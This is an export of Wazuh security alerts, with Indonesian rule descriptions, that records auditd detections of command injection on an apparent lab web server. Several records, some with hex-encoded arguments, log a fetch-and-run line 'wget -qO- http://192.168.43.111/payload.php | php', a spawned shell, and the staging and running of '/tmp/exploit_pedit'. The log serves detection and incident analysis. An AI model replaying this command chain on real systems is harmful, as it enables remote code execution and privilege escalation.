_index,_id,_version,_score,_source.agent.ip,_source.agent.name,_source.agent.id,_source.manager.name,_source.data.audit.syscall,_source.data.audit.gid,_source.data.audit.fsgid,_source.data.audit.session,_source.data.audit.pid,_source.data.audit.suid,_source.data.audit.type,_source.data.audit.uid,_source.data.audit.egid,_source.data.audit.exe,_source.data.audit.file.inode,_source.data.audit.file.mode,_source.data.audit.file.name,_source.data.audit.sgid,_source.data.audit.id,_source.data.audit.key,_source.data.audit.auid,_source.data.audit.execve.a1,_source.data.audit.execve.a2,_source.data.audit.execve.a0,_source.data.audit.euid,_source.data.audit.command,_source.data.audit.ppid,_source.data.audit.fsuid,_source.data.audit.exit,_source.data.audit.cwd,_source.data.audit.success,_source.data.audit.tty,_source.data.audit.arch,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.description,_source.rule.groups,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.rule.id,_source.decoder.parent,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,sort,_source.rule.hipaa,_source.rule.pci_dss,_source.rule.tsc,_source.rule.nist_800_53,_source.rule.gdpr,_source.predecoder.hostname,_source.predecoder.program_name,_source.predecoder.timestamp,_source.data.srcuser,_source.data.uid,_source.data.dstuser,_source.rule.gpg13,_source.data.audit.execve.a3,_source.syscheck.uname_after,_source.syscheck.mtime_after,_source.syscheck.size_after,_source.syscheck.gid_after,_source.syscheck.mode,_source.syscheck.path,_source.syscheck.sha1_after,_source.syscheck.gname_after,_source.syscheck.uid_after,_source.syscheck.perm_after,_source.syscheck.event,_source.syscheck.md5_after,_source.syscheck.sha256_after,_source.syscheck.inode_after,_source.data.audit.execve.a4,_source.data.audit.execve.a5,_source.data.audit.execve.a6,_source.data.audit.execve.a7,_source.syscheck.size_before,_source.syscheck.md5_before,_source.syscheck.sha256_before,_source.syscheck.changed_attributes,_source.syscheck.sha1_before,_source.data.euid,_source.data.tty,_source.data.pwd,_source.data.command,_source.decoder.ftscomment,_source.data.extra_data
wazuh-alerts-4.x-2026.07.31,bHo2t58BC43qgJRl-VMP,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3844,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,498,www_data_exec,4294967295,-c,--,sh,33,sh,2961,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,6,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485259.284:498): arch=c000003e syscall=59 success=yes exit=0 a0=73effeddb799 a1=7ffe9c45b550 a2=7ffe9c45e430 a3=8 items=2 ppid=2961 pid=3844 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485259.284:498): argc=4 a0=""sh"" a1=""-c"" a2=""--"" a3=6C73202F746D7020323E2631 type=CWD msg=audit(1785485259.284:498): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485259.284:498): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485259.284:498): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485259.284:498): proctitle=7368002D63002D2D006C73202F746D7020323E2631",log,"Jul 31, 2026 @ 15:07:39.673",/var/log/audit/audit.log,1785485259.340095,"Jul 31, 2026 @ 15:07:39.673",[1785485259673], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,bXo2t58BC43qgJRl-VMP,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3845,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/ls,395314,0100755,/usr/bin/ls,33,499,www_data_exec,4294967295,/tmp, ,ls,33,ls,3844,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,7,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ls"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485259.285:499): arch=c000003e syscall=59 success=yes exit=0 a0=57fbece5e650 a1=57fbece5e5b0 a2=57fbece5e5c8 a3=8 items=2 ppid=3844 pid=3845 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ls"" exe=""/usr/lib/cargo/bin/coreutils/ls"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485259.285:499): argc=2 a0=""ls"" a1=""/tmp"" type=CWD msg=audit(1785485259.285:499): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485259.285:499): item=0 name=""/usr/bin/ls"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485259.285:499): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485259.285:499): proctitle=6C73002F746D70",log,"Jul 31, 2026 @ 15:07:39.674",/var/log/audit/audit.log,1785485259.342151,"Jul 31, 2026 @ 15:07:39.674",[1785485259674], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,bno3t58BC43qgJRlXFN-,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3846,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,500,www_data_exec,4294967295,-c,--,sh,33,sh,1722,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,8,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485276.411:500): arch=c000003e syscall=59 success=yes exit=0 a0=73effeddb799 a1=7ffe9c45b530 a2=7ffe9c45e430 a3=8 items=2 ppid=1722 pid=3846 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485276.411:500): argc=4 a0=""sh"" a1=""-c"" a2=""--"" a3=63686D6F64202B78202F746D702F6578706C6F69745F706564697420323E2631 type=CWD msg=audit(1785485276.411:500): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485276.411:500): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485276.411:500): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485276.411:500): proctitle=7368002D63002D2D0063686D6F64202B78202F746D702F6578706C6F69745F706564697420323E2631",log,"Jul 31, 2026 @ 15:07:57.680",/var/log/audit/audit.log,1785485277.344171,"Jul 31, 2026 @ 15:07:57.680",[1785485277680], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,b3o3t58BC43qgJRlXFN-,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3847,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/chmod,395314,0100755,/usr/bin/chmod,33,501,www_data_exec,4294967295,+x,/tmp/exploit_pedit,chmod,33,chmod,3846,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,9,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""chmod"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485276.413:501): arch=c000003e syscall=59 success=yes exit=0 a0=6343c3ead5d0 a1=6343aea03628 a2=6343c3ead548 a3=210 items=2 ppid=3846 pid=3847 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""chmod"" exe=""/usr/lib/cargo/bin/coreutils/chmod"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485276.413:501): argc=3 a0=""chmod"" a1=""+x"" a2=""/tmp/exploit_pedit"" type=CWD msg=audit(1785485276.413:501): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485276.413:501): item=0 name=""/usr/bin/chmod"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485276.413:501): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485276.413:501): proctitle=63686D6F64002B78002F746D702F6578706C6F69745F7065646974",log,"Jul 31, 2026 @ 15:07:57.738",/var/log/audit/audit.log,1785485277.346307,"Jul 31, 2026 @ 15:07:57.738",[1785485277738], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,cHo3t58BC43qgJRlvlOQ,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3848,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,502,www_data_exec,4294967295,-c,--,sh,33,sh,1720,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,10,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485303.229:502): arch=c000003e syscall=59 success=yes exit=0 a0=73effeddb799 a1=7ffe9c45b530 a2=7ffe9c45e430 a3=8 items=2 ppid=1720 pid=3848 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485303.229:502): argc=4 a0=""sh"" a1=""-c"" a2=""--"" a3=77676574202D714F2D20687474703A2F2F3139322E3136382E34332E3131312F7061796C6F61642E706870207C20706870202620323E2631 type=CWD msg=audit(1785485303.229:502): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485303.229:502): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485303.229:502): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485303.229:502): proctitle=7368002D63002D2D0077676574202D714F2D20687474703A2F2F3139322E3136382E34332E3131312F7061796C6F61642E706870207C20706870202620323E2631",log,"Jul 31, 2026 @ 15:08:23.712",/var/log/audit/audit.log,1785485303.348452,"Jul 31, 2026 @ 15:08:23.712",[1785485303712], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,cXo3t58BC43qgJRlvlOR,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3849,33,SYSCALL,33,33,/usr/bin/wget,395704,0100755,/usr/bin/wget,33,503,www_data_exec,4294967295,-qO-,http://192.168.43.111/payload.php,wget,33,wget,3848,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,11,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""wget"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485303.230:503): arch=c000003e syscall=59 success=yes exit=0 a0=5d74d67fc910 a1=5d74d67fc868 a2=5d74d67fc888 a3=20 items=2 ppid=3848 pid=3849 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""wget"" exe=""/usr/bin/wget"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485303.230:503): argc=3 a0=""wget"" a1=""-qO-"" a2=""http://192.168.43.111/payload.php"" type=CWD msg=audit(1785485303.230:503): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485303.230:503): item=0 name=""/usr/bin/wget"" inode=395704 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485303.230:503): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485303.230:503): proctitle=77676574002D714F2D00687474703A2F2F3139322E3136382E34332E3131312F7061796C6F61642E706870",log,"Jul 31, 2026 @ 15:08:23.759",/var/log/audit/audit.log,1785485303.350684,"Jul 31, 2026 @ 15:08:23.759",[1785485303759], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,cno3t58BC43qgJRlvlOR,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3850,33,SYSCALL,33,33,/usr/bin/php8,394972,0100755,/usr/bin/php,33,504,www_data_exec,4294967295, , ,php,33,php,3848,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,12,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""php"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485303.231:504): arch=c000003e syscall=59 success=yes exit=0 a0=5d74d67fc908 a1=5d74d67fc870 a2=5d74d67fc880 a3=210 items=2 ppid=3848 pid=3850 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""php"" exe=""/usr/bin/php8.5"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485303.231:504): argc=1 a0=""php"" type=CWD msg=audit(1785485303.231:504): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485303.231:504): item=0 name=""/usr/bin/php"" inode=394972 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485303.231:504): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485303.231:504): proctitle=""php""",log,"Jul 31, 2026 @ 15:08:23.759",/var/log/audit/audit.log,1785485303.352845,"Jul 31, 2026 @ 15:08:23.759",[1785485303759], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,c3o3t58BC43qgJRlvlOT,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3851,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,505,www_data_exec,4294967295,-c, ,sh,33,sh,3850,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,13,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485308.131:505): arch=c000003e syscall=59 success=yes exit=0 a0=61b909a1773a a1=7ffdef4d4e10 a2=61b92ada9010 a3=8 items=2 ppid=3850 pid=3851 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485308.131:505): argc=3 a0=""sh"" a1=""-c"" a2=2F62696E2F736820 type=CWD msg=audit(1785485308.131:505): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485308.131:505): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485308.131:505): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485308.131:505): proctitle=7368002D63002F62696E2F736820",log,"Jul 31, 2026 @ 15:08:29.721",/var/log/audit/audit.log,1785485309.354799,"Jul 31, 2026 @ 15:08:29.721",[1785485309721], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,dHo3t58BC43qgJRlwlNk,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3852,33,SYSCALL,33,33,/usr/bin/dash,395323,0100755,/bin/sh,33,506,www_data_exec,4294967295, , ,/bin/sh,33,sh,3851,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,14,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""sh"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485308.133:506): arch=c000003e syscall=59 success=yes exit=0 a0=5603610aa520 a1=5603610aa540 a2=5603610aa550 a3=8 items=2 ppid=3851 pid=3852 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""sh"" exe=""/usr/bin/dash"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485308.133:506): argc=1 a0=""/bin/sh"" type=CWD msg=audit(1785485308.133:506): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485308.133:506): item=0 name=""/bin/sh"" inode=395323 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485308.133:506): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485308.133:506): proctitle=""/bin/sh""",log,"Jul 31, 2026 @ 15:08:29.806",/var/log/audit/audit.log,1785485309.356805,"Jul 31, 2026 @ 15:08:29.806",[1785485309806], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,dXo3t58BC43qgJRlwlNk,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3853,33,SYSCALL,33,33,/usr/lib/cargo/bin/coreutils/ls,395314,0100755,/usr/bin/ls,33,507,www_data_exec,4294967295,/tmp, ,ls,33,ls,3852,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,15,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""ls"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485310.693:507): arch=c000003e syscall=59 success=yes exit=0 a0=5d7fd9d09610 a1=5d7fd9d09570 a2=5d7fd9d09588 a3=8 items=2 ppid=3852 pid=3853 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""ls"" exe=""/usr/lib/cargo/bin/coreutils/ls"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485310.693:507): argc=2 a0=""ls"" a1=""/tmp"" type=CWD msg=audit(1785485310.693:507): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485310.693:507): item=0 name=""/usr/bin/ls"" inode=395314 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PATH msg=audit(1785485310.693:507): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=396099 dev=fc:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root"" type=PROCTITLE msg=audit(1785485310.693:507): proctitle=6C73002F746D70",log,"Jul 31, 2026 @ 15:08:31.662",/var/log/audit/audit.log,1785485311.358754,"Jul 31, 2026 @ 15:08:31.662",[1785485311662], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2026.07.31,dno3t58BC43qgJRl4lME,1, ,10.10.10.10,web-server,005,Wazuh,59,33,33,4294967295,3855,33,SYSCALL,33,33,/tmp/exploit_pedit,86,0100755,/tmp/exploit_pedit,33,508,www_data_exec,4294967295, , ,/tmp/exploit_pedit,33,exploit_pedit,3852,33,0,/var/www/html/hackable/uploads,yes,(none),c000003e,16,true,12,"LOLBin: www-data (Apache) menjalankan proses baru ""exploit_pedit"" - indikasi command injection","[""auditd"",""lolbin"",""command_injection""]","[""Command and Scripting Interpreter""]","[""T1059""]","[""Execution""]",100300,auditd,auditd,"type=SYSCALL msg=audit(1785485316.825:508): arch=c000003e syscall=59 success=yes exit=0 a0=5d7fd9d09520 a1=5d7fd9d09550 a2=5d7fd9d09560 a3=8 items=1 ppid=3852 pid=3855 auid=4294967295 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=(none) ses=4294967295 comm=""exploit_pedit"" exe=""/tmp/exploit_pedit"" subj=unconfined key=""www_data_exec""ARCH=x86_64 SYSCALL=execve AUID=""unset"" UID=""www-data"" GID=""www-data"" EUID=""www-data"" SUID=""www-data"" FSUID=""www-data"" EGID=""www-data"" SGID=""www-data"" FSGID=""www-data"" type=EXECVE msg=audit(1785485316.825:508): argc=1 a0=""/tmp/exploit_pedit"" type=CWD msg=audit(1785485316.825:508): cwd=""/var/www/html/hackable/uploads"" type=PATH msg=audit(1785485316.825:508): item=0 name=""/tmp/exploit_pedit"" inode=86 dev=00:29 mode=0100755 ouid=33 ogid=33 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""www-data"" OGID=""www-data"" type=PROCTITLE msg=audit(1785485316.825:508): proctitle=""/tmp/exploit_pedit""",log,"Jul 31, 2026 @ 15:08:37.636",/var/log/audit/audit.log,1785485317.360774,"Jul 31, 2026 @ 15:08:37.636",[1785485317636], , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
